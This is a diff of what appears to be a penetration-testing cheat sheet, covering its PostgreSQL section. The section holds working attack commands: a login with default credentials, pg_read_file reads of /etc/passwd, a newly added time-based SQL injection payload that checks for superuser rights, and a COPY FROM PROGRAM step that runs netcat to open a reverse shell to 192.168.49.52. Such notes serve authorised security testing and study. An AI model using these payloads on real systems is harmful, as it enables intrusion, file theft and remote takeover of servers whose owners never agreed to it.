@@ -250,11 +250,16 @@ xfreerdp /v:[IP_ADDR] /u:[USERNAME] /p:[PASSWORD] /cert:ignore +clipboard /dynam
 
 #### Postgresql (5432)
 
+{% code overflow="wrap" %}
 ```shell
 psql -U [USERNAME] -p [PORT] -h [HOST]    # default postgres:postgres
 \l    # list databases
 select pg_ls_dir('/home/');
 select pg_read_file('/etc/passwd');
+-------------TIME BASED-------------
+# CHECK IF CURRENT USER IS SUPERUSER
+1;SELECT case when (SELECT current_setting($$is_superuser$$))=$$on$$ then pg_sleep(15) end;--
+
 -------------RCE
 postgres=# DROP TABLE IF EXISTS cmd_exec;
 DROP TABLE
@@ -270,6 +275,7 @@ postgres=# SELECT * FROM cmd_exec;
 
 postgres=# COPY cmd_exec FROM PROGRAM 'nc 192.168.49.52 80 -e /bin/bash';
 ```
+{% endcode %}
 
 #### Redis (6379)
 
